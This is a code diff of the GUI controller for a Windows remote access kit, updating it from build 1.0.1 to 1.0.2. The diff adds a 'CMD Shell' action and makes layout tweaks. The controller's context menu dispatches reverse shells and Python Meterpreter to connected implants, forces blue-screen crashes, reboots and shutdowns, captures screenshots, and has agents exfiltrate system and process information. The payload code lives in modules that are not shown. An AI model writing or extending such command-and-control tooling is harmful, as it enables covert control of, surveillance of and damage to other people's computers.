@@ -10,11 +10,11 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.1
+# Build:  1.0.2
 # -------------------------------------------------------------
 from PyQt5 import QtCore, QtGui, QtWidgets
 from PyQt5.Qt import Qt
-from PyQt5.QtWidgets import QWidget,QMenu
+from PyQt5.QtWidgets import QWidget,QMenu,QAbstractItemView
 from PyQt5.QtCore import QEvent
 
 from ..logging.logging import LoggingUtilitys,NetworkingConfigs,ClientWindow,ConsoleWindow
@@ -32,7 +32,7 @@ from ..utils.file_paths import DSFilePath
 from ..networking.dns_handler import DomainHandler
 from ..networking.socket import Utilitys
 
-from ..client_handling.shell import Meterpreter,PowerShell
+from ..client_handling.shell import Meterpreter,SystemShell
 from ..client_handling.networking import NetHandle
 from ..client_handling.enumeration import SystemCommands
 from ..client_handling.system import SystemManager
@@ -46,7 +46,7 @@ listening_ports_array = []
 active_connections_array = []
 listening_sockets_array = []
 
-BUILD_VERSION = '1.0.1'
+BUILD_VERSION = '1.0.2'
 
 #Thread for running background tasks. Qt does not run well with the pythons threading libs
 class ProcessRunnable(QtCore.QRunnable):
@@ -99,7 +99,7 @@ class Ui_main_window(QWidget):
                 self.active_connections_list.setRowCount(number_of_conns)   #Create rows = to the number of connections
             for row in range(number_of_conns):                              #For each connection
                 if active_conns_list[row] not in active_connections_array:  #If the conn written by the socket is not in the global array
-                    active_connections_array.append(active_conns_list[row]) #Append the connection froms socket file to the global array
+                    active_connections_array.append(active_conns_list[row]) #Append the connection from socket file to the global array
                 column_count = 0                                            #Set column counter to 0
                 for item in active_conns_list[row].split(', '):             #For each piece of info in the respective row
                     data_cell = QtWidgets.QTableWidgetItem()                #Create item object
@@ -115,7 +115,7 @@ class Ui_main_window(QWidget):
                     elif column_count != 0:                                     #If its not the first column
                         data_cell = QtWidgets.QTableWidgetItem(item.strip("'").strip("[']"))    #Create item without icon
                     data_cell.setTextAlignment(Qt.AlignCenter)              # Align text in cell to center
-                    data_cell.setFlags(Qt.ItemIsEnabled)                    # Make cell read-only otherwise it is editable
+                    data_cell.setFlags(Qt.ItemIsEnabled | Qt.ItemIsSelectable)# Make cell read-only otherwise it is editable
                     data_cell.setBackground(Qt.transparent)                 # Make cell background transparent
                     self.active_connections_list.setItem(row, column_count, data_cell)  # add data to respective location
                     column_count += 1                                       #Add one to the column counter
@@ -148,6 +148,8 @@ class Ui_main_window(QWidget):
     #Function will update the current interface label to the current interface
     def update_current_interface(self):
         current_int = NetworkingConfigs().retrieve_network_interface()          #Get the current network interface
+        if current_int == '':                                                   #If the server nic has not been selected
+            current_int = 'NOT SELECTED'                                        #Set label to string "Not Selected"
         self.interface_label.setText(f"Network Interface: {current_int}")       #Change the text to the interface
 
     #Function will update data tx/rx label
@@ -211,6 +213,7 @@ class Ui_main_window(QWidget):
 
         if event.type() == QEvent.ContextMenu and source is self.active_connections_list and self.active_connections_list.currentRow() > -1:   #If event is left click and the source is the active connections list
                                                                                                                                                #And there is a connection in the row
+
             context_menu = QMenu(self)                  #Create Menu Object
             networking_menu = context_menu.addMenu('Networking')        #Create networking submenu
             networking_menu.setIcon(IconObj().net_icon)                           #Add Icon to networking menu
@@ -248,41 +251,54 @@ class Ui_main_window(QWidget):
             surveillance_menu.setIcon(IconObj().surveillance_icon)      #Icon
             screenshot = surveillance_menu.addAction('Screenshot')      #Screenshot action
             screenshot.setIcon(IconObj().screenshot_icon)               #Icon
-
+            CMD_shell = system_menu.addAction('CMD Shell')              #Add Command shell action to system shells menu
+            CMD_shell.setIcon(IconObj().cmd_shell_icon)
             action = context_menu.exec_(self.mapToGlobal(event.globalPos()))    #Define the click action bool for the menu
+
             if action == python_meterpreter:                            #If python meterpreter is clicked
                 lport = NetworkingConfigs().retrieve_shell_lport()  # Get the listening port
                 ConsoleWindow().log_to_console('Starting python meterpreter listener on port {lport}') #Log to console
                 Meterpreter().exec_python_meterpreter_shell(lport, get_key_from_row(),get_client_socket_obj())  #Send the shell code to the agent
+
             if action == powershell_shell:                              #If powershell shell is clicked
                 lport = NetworkingConfigs().retrieve_shell_lport()      #Get the listening port
                 ConsoleWindow().log_to_console(f'Starting netcat listener on {lport}') #Log to console
-                PowerShell().exec_reverse_shell(lport,get_key_from_row(),get_client_socket_obj())   #Send the shell code
+                SystemShell().exec_reverse_shell(lport, get_key_from_row(), get_client_socket_obj())   #Send the shell code
+
+            if action == CMD_shell:
+                ConsoleWindow().log_to_console('Launching command shell on client')
+                SystemShell().exec_cmd_shell(get_client_socket_obj(),get_key_from_row())
+
             if action == reconnect_action:                              #If the reconnect action is clicked
                 ConsoleWindow().log_to_console('Reconnecting client')   #Log action to console
                 NetHandle().client_reconnect(get_key_from_row(),get_client_socket_obj())        #Tell the client to reconnect
                 ClientWindow().remove_active_connection(Utilitys().retrieve_client_info_array(), get_key_from_row().decode())
                 remove_client_socket()
+
             if action == ping_client:                                   #If action is ping client
                 NetHandle().ping_client(get_key_from_row(),get_client_socket_obj())             #Ping the client and catch the reply
+
             if action == blue_screen:                                   #If action is to blue screen the client
                 ConsoleWindow().log_to_console('Forcing system crash on client') #Log action to console
                 SystemManager().force_blue_screen(get_key_from_row(),get_client_socket_obj())   #Force agent to bluescreen computer
                 ClientWindow().remove_active_connection(Utilitys().retrieve_client_info_array(),    #Remove client from screen
                                                         get_key_from_row().decode())
                 remove_client_socket()                                                          #Remove the socket
+
             if action == reboot_client:                                  #If action is to reboot the client
                 ConsoleWindow().log_to_console('Rebooting Client')      #Log to console
                 SystemManager().reboot_client_system(get_key_from_row(),get_client_socket_obj()) #Force agent to reboot computer
                 ClientWindow().remove_active_connection(Utilitys().retrieve_client_info_array(),#Remove client from screen
                                                         get_key_from_row().decode())
                 remove_client_socket()                                                          #Remove client socket
+
             if action == shutdown_client:                                #If action is to shutdown the client
                 ConsoleWindow().log_to_console('Shutting down client computer') #Log to console
                 SystemManager().shutdown_client_system(get_key_from_row(),get_client_socket_obj())#Force agent to shutdown the computer
                 ClientWindow().remove_active_connection(Utilitys().retrieve_client_info_array(),#Remove client from screen
                                                         get_key_from_row().decode())
                 remove_client_socket()                                                          #Remove the socket
+
             if action == system_info:
                 ConsoleWindow().log_to_console('Retrieving client system information') #Log to console
                 SystemCommands().exfil_sys_and_ip_info(get_key_from_row(),get_client_socket_obj()) #Tell agent to run commands, open socket to receive output
@@ -291,16 +307,19 @@ class Ui_main_window(QWidget):
                         break                                   #Break the loop
                 ConsoleWindow().log_to_console('Received output from client') #Log to console
                 self.open_new_window(Ui_host_info_window)       #Open window with the command output. Window will populate data from file.
+
             if action == screenshot:
                 ConsoleWindow().log_to_console('Capturing screenshot from client') #Log to console
                 Streaming().get_client_screenshot(get_key_from_row(),get_client_socket_obj())   #Get screenshot
                 self.open_new_window(Ui_screenshot_window)              #Open window with photo
                 ConsoleWindow().log_to_console('Received screenshot')   #Log to console
+
             if action == disconnect_action:                             #If action is to disconnect client
                 ConsoleWindow().log_to_console('Disconnecting client')  #Log to console
                 NetHandle().disconnect_client(get_key_from_row(),get_client_socket_obj())       #Disconnect the client
                 ClientWindow().remove_active_connection(Utilitys().retrieve_client_info_array(),get_key_from_row().decode()) #Remove the connection from the array
                 remove_client_socket()                                  #Remove the socket
+
             if action == get_client_process:                            #If the action is to get the client process
                 ConsoleWindow().log_to_console('Starting task manager') #Log to console
                 SystemCommands().extract_running_process(get_key_from_row(),get_client_socket_obj()) #Instruct agent to exfiltrate client process's
@@ -309,18 +328,21 @@ class Ui_main_window(QWidget):
                         sleep(1)                                        #Hold the main thread for 1 second
                         break                                           #Break the loop
                 self.open_client_compatible_window(Ui_task_manager_dialog,get_client_socket_obj(),get_key_from_row())   #Open the task manager window
+
             return True
         return super().eventFilter(source, event)
 
     def setupUi(self, main_window):
         main_window.setObjectName("main_window")
-        main_window.resize(1575, 784)                           #Change main window size
+        main_window.resize(1574, 784)                           #Change main window size
         main_window.setWindowIcon(IconObj().main_window_icon)  #Set main window icon
         main_window.setStyleSheet(f"background-image: url({BGPath().main_window_bg});")
+        main_window.setMaximumSize(1574, 784)
         self.centralwidget = QtWidgets.QWidget(main_window)
         self.centralwidget.setObjectName("centralwidget")
         self.active_connections_list = QtWidgets.QTableWidget(self.centralwidget)
-        self.active_connections_list.setGeometry(QtCore.QRect(0, 0, 1575, 351))
+        self.active_connections_list.setGeometry(QtCore.QRect(0, 0, 1574, 351))
+        self.active_connections_list.setSelectionBehavior(QAbstractItemView.SelectRows) #Make entire row highlight when clicked
         self.active_connections_list.setSizePolicy(QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Expanding)
         self.active_connections_list.setAutoFillBackground(True)
         self.active_connections_list.setObjectName("active_connections_list")
@@ -348,10 +370,11 @@ class Ui_main_window(QWidget):
         self.active_connections_list.setHorizontalHeaderItem(8, item)
         for i in range(8):
             self.active_connections_list.setColumnWidth(int(i), 174)
-        self.active_connections_list.setColumnWidth(8,181)
+        self.active_connections_list.setColumnWidth(8,180)
         self.active_connections_list.installEventFilter(self)
+        #self.active_connections_list.setSelectionBehavior(QAbstractItemView.SelectRows)
         self.implant_callback_window = QtWidgets.QListWidget(self.centralwidget)
-        self.implant_callback_window.setGeometry(QtCore.QRect(1030, 390, 551, 251))
+        self.implant_callback_window.setGeometry(QtCore.QRect(787, 350, 787, 414))
         self.implant_callback_window.setStyleSheet("")
         self.implant_callback_window.setObjectName("implant_callback_window")
         ##############################
@@ -411,7 +434,7 @@ class Ui_main_window(QWidget):
         #                END MENU BAR                           #
         #########################################################
         self.status_window = QtWidgets.QLabel(self.centralwidget)
-        self.status_window.setGeometry(QtCore.QRect(20, 370, 731, 221))
+        self.status_window.setGeometry(QtCore.QRect(0, 349, 787, 414))
         self.status_window.setStyleSheet(f"background-image: url({ImageObj().grey_box});")
         self.status_window.setObjectName("status_window")
         self.connections_label = QtWidgets.QLabel(self.centralwidget)
@@ -437,7 +460,7 @@ class Ui_main_window(QWidget):
         self.data_label_icon.setScaledContents(True)
         self.data_label_icon.setObjectName("data_label_icon")
         self.interface_label = QtWidgets.QLabel(self.centralwidget)
-        self.interface_label.setGeometry(QtCore.QRect(60, 560, 181, 19))
+        self.interface_label.setGeometry(QtCore.QRect(60, 560, 240, 19))
         self.interface_label.setStyleSheet(f"background-image: url({ImageObj().grey_box});")
         self.interface_label.setObjectName("interface_label")
         self.nic_label_icon = QtWidgets.QLabel(self.centralwidget)
@@ -447,22 +470,22 @@ class Ui_main_window(QWidget):
         self.nic_label_icon.setScaledContents(True)
         self.nic_label_icon.setObjectName("nic_label_icon")
         self.active_sockets_label = QtWidgets.QLabel(self.centralwidget)
-        self.active_sockets_label.setGeometry(QtCore.QRect(255,480,150,20))
+        self.active_sockets_label.setGeometry(QtCore.QRect(305,480,150,20))
         self.active_sockets_label.setStyleSheet(f"background-image: url({ImageObj().grey_box});")
         self.active_sockets_label.setText("Active Sockets")
         self.active_sockets_label_icon =QtWidgets.QLabel(self.centralwidget)
-        self.active_sockets_label_icon.setGeometry(QtCore.QRect(230,480,20,20))
+        self.active_sockets_label_icon.setGeometry(QtCore.QRect(280,480,20,20))
         self.active_sockets_label_icon.setStyleSheet(f"background-image: url({ImageObj().grey_box});")
         self.active_sockets_label_icon.setPixmap(PixmapObj().listener_pixmap)
         self.active_sockets_label_icon.setScaledContents(True)
         self.listening_sockets_list = QtWidgets.QListWidget(self.centralwidget)
-        self.listening_sockets_list.setGeometry(QtCore.QRect(250, 510,101,70))
-        self.gwa_ascii_label = QtWidgets.QLabel(self.centralwidget)
-        self.gwa_ascii_label.setGeometry(QtCore.QRect(20, 360, 370, 140))
-        self.gwa_ascii_label.setStyleSheet(f"background-image: url({ImageObj().gwa_ascii_art});")
-        self.gwa_ascii_label.setObjectName("gwa_ascii_label")
+        self.listening_sockets_list.setGeometry(QtCore.QRect(300, 510,101,70))
+        self.qwire_ascii_label = QtWidgets.QLabel(self.centralwidget)
+        self.qwire_ascii_label.setGeometry(QtCore.QRect(20, 360, 370, 140))
+        self.qwire_ascii_label.setStyleSheet(f"background-image: url({ImageObj().gwa_ascii_art});")
+        self.qwire_ascii_label.setObjectName("gwa_ascii_label")
         self.ascii_globe_label = QtWidgets.QLabel(self.centralwidget)
-        self.ascii_globe_label.setGeometry(385, 380, 355, 201)
+        self.ascii_globe_label.setGeometry(425, 380, 355, 201)
         self.ascii_globe_label.setObjectName("ascii_globe_label")
         self.ascii_globe_label.setScaledContents(True)
         self.spinning_globe = QtGui.QMovie(ImageObj().spinning_globe_gif)
